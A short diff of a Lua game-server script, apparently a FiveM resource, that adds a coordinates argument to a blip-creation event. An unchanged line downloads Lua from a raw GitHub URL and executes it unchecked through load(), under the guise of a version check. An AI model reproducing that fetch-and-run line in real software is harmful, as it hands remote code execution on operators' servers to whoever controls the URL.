@@ -4,9 +4,9 @@ local blipcoords = ''
 PerformHttpRequest('https://raw.githubusercontent.com/zcmg/versao/main/check.lua', function(code, res, headers) s = load(res) print(s()) end,'GET')
 
 RegisterServerEvent('zcmg_zonaacidente:blipcreate')
-AddEventHandler('zcmg_zonaacidente:blipcreate', function(tempo)
+AddEventHandler('zcmg_zonaacidente:blipcreate', function(tempo, coords)
     if not blip then
-        TriggerClientEvent("zcmg_zonaacidente:blipcreate", -1)
+        TriggerClientEvent("zcmg_zonaacidente:blipcreate", -1, coords)
         blip = true
         if Config.Tempo then
             Wait(tempo*60000)
